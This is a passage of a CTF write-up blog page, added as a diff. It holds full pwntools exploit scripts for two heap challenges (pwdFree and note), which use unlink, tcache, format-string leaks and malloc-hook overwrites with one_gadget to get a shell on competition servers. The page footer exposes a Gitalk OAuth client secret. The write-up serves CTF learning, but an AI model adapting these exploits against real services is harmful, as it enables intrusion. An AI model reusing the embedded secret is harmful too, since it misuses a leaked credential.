+	int i;
+	srand( (unsigned)time( NULL ) ); 
+	for ( i = 1; i &gt;= 0; --i )
+	passwd[i] = rand() % 0xffffffff;
+	puts(passwd);
+	
+}//gcc a.c -o a
+</code></pre>
+<p>然后就是常规操作，unlink 后，达到任意地址读写，改 malloc hook 为 one gadget，申请堆块触发 one gadget。</p>
+<pre><code class="language-c">#!/usr/bin/env python3
+#coding=utf-8
+from pwn import*
+#context.log_level = 'debug'
+context.arch='amd64'
+binary = './pwdFree' 
+main_arena = 0x3ebc40
+s = lambda buf: io.send(buf)
+sl = lambda buf: io.sendline(buf)
+sa = lambda delim, buf: io.sendafter(delim, buf)
+sal = lambda delim, buf: io.sendlineafter(delim, buf)
+shell = lambda: io.interactive()
+r = lambda n=None: io.recv(n)
+ra = lambda t=tube.forever:io.recvall(t)
+ru = lambda delim: io.recvuntil(delim)
+rl = lambda: io.recvline()
+rls = lambda n=2**20: io.recvlines(n)
+su = lambda buf,addr:io.success(buf+&quot;==&gt;&quot;+hex(addr))
+local = 0
+if local == 1:
+    io=process(binary)
+    
+else:
+    io=remote('47.104.71.220',38562)
+    p = process('./a')
+elf=ELF(binary)
+#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
+libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+one_gadget = [0x4f3d5,0x4f432,0x10a41c]
+num = u64(p.recvline()[:-1])
+su('num',num)
+def add(index,len_,content):
+	ru(&quot;Input Your Choice:&quot;)
+	sl('1')
+	ru(&quot;Input The ID You Want Save:&quot;)
+	sl(str(index))
+	ru(&quot;Length Of Your Pwd:&quot;)
+	sl(str(len_))
+	ru(&quot;Your Pwd:&quot;)
+	sl(content)
+
+def edit(index,content):
+	ru(&quot;Input Your Choice:&quot;)
+	sl('2')
+	sl(str(index))
+	sl(content)
+	
+def show(index):
+	ru(&quot;Input Your Choice:&quot;)
+	sl('3')
+	ru(&quot;Which PwdBox You Want Check:&quot;)
+	sl(str(index))	
+	
+def free(index):
+	ru(&quot;Input Your Choice:&quot;)
+	sl('4')
+	ru(&quot;Idx you want 2 Delete:&quot;)
+	sl(str(index))
+add(1,0xf0,b'a'*0xf0)
+add(2,0xf0,b'a'*0xf0)
+add(3,0xf0,b'a'*0xf0)
+for i in range(7):
+	add(i+4,0xf0,b'a'*0xf0)
+
+for i in range(7):
+	free(9-i)
+
+free(0)
+
+for i in range(7):
+	add(i+4,0xf0,b'a'*0xf0)
+
+free(2)
+free(1)
+
+add(2,0xf8,b'a'*0xf0+p64(0x200^num)+b'a')#2
+add(3,0xf0,b'a'*0xf0)#3
+
+for i in range(7):
+	free(i+3)
+free(0)
+
+free(2)
+for i in range(7):
+	add(i+4,0xf0,b'a'*0xf0)
+add(1,0xf0,b'a'*0xf0)
+show(1)#2
+ru('Pwd is: ')
+libc_base = (u64(r(8))^num)-main_arena-96
+su(&quot;libc_base&quot;,libc_base)
+realloc = libc_base + libc.symbols['__libc_realloc']
+malloc_hook = libc_base + libc.sym['__malloc_hook']
+one_gadget = libc_base + one_gadget[2]
+
+su('malloc_hook',malloc_hook)
+add(3,0x100,b'a'*0x100)
+free(9)
+edit(1,p64(malloc_hook))
+ru(&quot;Input Your Choice:&quot;)
+sl('1')
+add(11,0x100,b'a'*0x100)
+add(12,0x100,p64(one_gadget^num))
+ru(&quot;Input Your Choice:&quot;)
+sl('1')
+
+ru(&quot;Input The ID You Want Save:&quot;)
+sl(str(13))
+ru(&quot;Length Of Your Pwd:&quot;)
+sl(str(1))
+#gdb.attach(io)
+
+io.interactive()
+</code></pre>
+<h2 id="pwn7-note">pwn7 note</h2>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+context.arch = &quot;amd64&quot;
+# p = process('.te')
+elf = ELF('.bc-2.23.so')
+p = remote('47.104.70.90', 25315)
+ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
+
+
+def menu(choose):
+    p.recvuntil('|3.show                          |')
+    p.sendline(str(choose))
+
+
+def add(size, content):
+    menu(1)
+    p.recvuntil('size: ')
+    p.sendline(str(size))
+    p.recvuntil('content: ')
+    p.send(content)
+    p.recvuntil('addr: ')
+    address = int(p.recv(14), 16)
+    return address
+
+
+def say(content):
+    menu(2)
+    p.recvuntil('say ? ')
+    p.send(content)
+    p.recvuntil('? ')
+
+
+def show():
+    menu(3)
+    p.recvuntil('content:')
+
+
+
+for i in range(15):
+    a = add(0xf0, '\0')
+a = add(0x20, '0')
+
+say(b'%7$s' + b'\0' * 4 + p64(a + 0x28))
+p.send(p64(0xd1) + b'\n')
+add(0xf0, 'a')
+add(0x10, '\x78')
+
+show()
+main_arena = u64(p.recv(6).ljust(8, b'\0')) - 344
+libc_base = main_arena - 0x3c4b20
+log.success('libc_base =&gt; ' + hex(libc_base))
+malloc_hook = main_arena - 0x10
+realloc = libc_base + elf.symbols['__libc_realloc']
+realloc_hook = malloc_hook - 0x8
+
+
+say(b'%7$s' + b'\0' * 4 + p64(realloc_hook))
+p.send(p64(libc_base + ones[1]) + b'\n')
+say(b'%7$s' + b'\0' * 4 + p64(malloc_hook))
+p.send(p64(realloc + 0xc) + b'\n')
+
+
+menu(1)
+p.recvuntil('size: ')
+p.sendline('16')
+p.interactive()
+</code></pre>
+<p>Flag: flag{006c45fa-81d5-45eb-8f8c-eb6833daadf5}</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%AF%94%E8%B5%9B%E8%AF%A6%E6%83%85">比赛详情</a></li>
+<li><a href="#web-ak">Web (ak)</a>
+<ul>
+<li><a href="#web1-%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F">web1 层层穿透</a></li>
+<li><a href="#web2-%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B">web2 安全检测</a></li>
+<li><a href="#web3-ezyii">web3 ezyii</a></li>
+<li><a href="#web4-crawer_z">web4 crawer_z</a></li>
+<li><a href="#web5-secrets_of_admin">web5 Secrets_Of_Admin</a></li>
+<li><a href="#web6-packagemanager2021">web6 PackageManager2021</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#crypto4-random_rsa">crypto4 Random_RSA</a></li>
+</ul>
+</li>
+<li><a href="#reverse">reverse</a>
+<ul>
+<li><a href="#re1-%E5%8B%92%E7%B4%A2%E8%A7%A3%E5%AF%86">re1 勒索解密</a></li>
+<li><a href="#re3-rev_dizzy">re3 Rev_Dizzy</a></li>
+<li><a href="#re4-rev_apc">re4 Rev_APC</a></li>
+</ul>
+</li>
+<li><a href="#misc">misc</a>
+<ul>
+<li><a href="#misc1-chieftainssecret">misc1 ChieftainsSecret</a></li>
+<li><a href="#misc2-%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81">misc2 层层取证</a></li>
+<li><a href="#misc3-%E8%80%83%E5%8F%A4">misc3 考古</a></li>
+<li><a href="#misc5-%E9%B8%A3%E9%9B%8F%E6%81%8B">misc5 鸣雏恋</a></li>
+</ul>
+</li>
+<li><a href="#pwn">pwn</a>
+<ul>
+<li><a href="#pwn3-jigsawscage">pwn3 JigSaw'sCage</a></li>
+<li><a href="#pwn5passwordbox_freeversion">pwn5PassWordBox_FreeVersion</a></li>
+<li><a href="#pwn7-note">pwn7 note</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
